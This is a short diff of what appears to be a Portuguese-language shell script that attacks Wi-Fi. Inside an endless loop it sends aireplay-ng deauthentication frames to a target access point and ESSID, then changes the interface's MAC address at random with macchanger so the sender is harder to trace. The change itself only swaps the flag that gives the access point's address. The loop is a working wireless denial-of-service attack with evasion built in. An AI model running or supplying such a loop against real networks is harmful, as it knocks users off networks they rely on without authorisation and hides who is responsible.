@@ -14,7 +14,7 @@ else
     while true
     do
         iwconfig "$interface" channel "$channel"
-        aireplay-ng -0 1 -a "$ponto_acesso" -e "$ESSID" "$interface" | grep "deauth"
+        aireplay-ng -0 1 -b "$ponto_acesso" -e "$ESSID" "$interface" | grep "deauth"
         ifconfig "$interface" down
         macchanger -r "$interface" | grep "New MAC"
         ifconfig "$interface" up
